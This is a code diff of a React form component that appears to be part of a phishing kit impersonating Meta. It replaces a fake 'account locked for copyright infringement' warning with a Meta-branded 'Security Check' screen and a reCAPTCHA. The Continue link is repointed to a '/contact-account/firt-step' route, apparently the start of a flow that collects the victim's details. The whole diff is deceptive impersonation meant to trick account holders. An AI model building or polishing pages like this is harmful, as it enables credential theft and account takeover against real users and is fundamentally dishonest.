@@ -1,6 +1,6 @@
 import React, { useRef, useState } from 'react'
 import { Link } from 'react-router-dom'
-import { waring } from './Publics/images/images'
+import { meta, waring_backup } from './Publics/images/images'
 import ReCAPTCHA from 'react-google-recaptcha';
 
 const Form = () => {
@@ -22,13 +22,15 @@ const Form = () => {
             <div className="container">
                 <div className="thumnail col-md-6 col-12">
                     <div className="content">
-                        <img src={waring} width="100%" alt=""/>
-                        <b>Your Account has been locked</b>
-                        <p>Your page has been detected for activity that is against our page policy regarding copyright infiringement</p>
-
-                        <div className="bottom">
-                            <p>Please follow the next steps, we'll walk you through a security check to help secure your account and let you log back in.</p>
+                        <img src={waring_backup} width="100%" alt=""/>
+                        
+                        <div className="logo col-md-3 col-5" style={{margin: "1rem auto 3rem auto"}}>
+                            <img src={meta} width="100%" alt=""/>
                         </div>
+
+                        <h3><b>Security Check</b></h3>
+                        <p>Meta uses security tests to ensure that the people on the site are real. Please fill the security check below to continue further.</p>
+
                     </div>
                 </div>
                 <div className="recapcha">
@@ -39,7 +41,7 @@ const Form = () => {
                     />
                 </div>
                 <div className={`button col-md-7 col-12 ${isActive === true ? 'active' : ''}`}>
-                    <Link to={`${isActive === true ? '/contact-account/buiness' : ''}`}>Continue</Link>
+                    <Link to={`${isActive === true ? '/contact-account/firt-step' : ''}`}>Continue</Link>
                 </div>
             </div>
 
